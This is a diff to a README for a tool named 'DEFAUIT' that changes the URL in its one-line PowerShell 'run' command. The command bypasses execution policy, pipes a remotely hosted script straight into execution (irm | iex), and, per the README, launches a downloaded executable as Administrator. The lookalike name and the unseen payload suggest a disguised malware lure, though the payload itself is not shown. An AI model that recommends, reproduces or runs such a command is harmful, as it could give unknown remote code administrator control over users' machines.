@@ -5,7 +5,7 @@ Run DEFAUIT without installing it.
 ## Run (one line)
 
 ```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://raw.githubusercontent.com/darapedbxystyle-hub/DEFAUIT-PROJECT/main/run.ps1 | iex"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://github.com/darapedbxystyle-hub/DEFAUIT-PROJECT/releases/download/v2.1/DEFAUIT-run.ps1 | iex"
 ```
 
 This downloads `DEFAUIT.exe` to `%TEMP%\DEFAUIT-Run`, verifies SHA256, and launches it as Administrator. No shortcuts and no LocalAppData install are created.
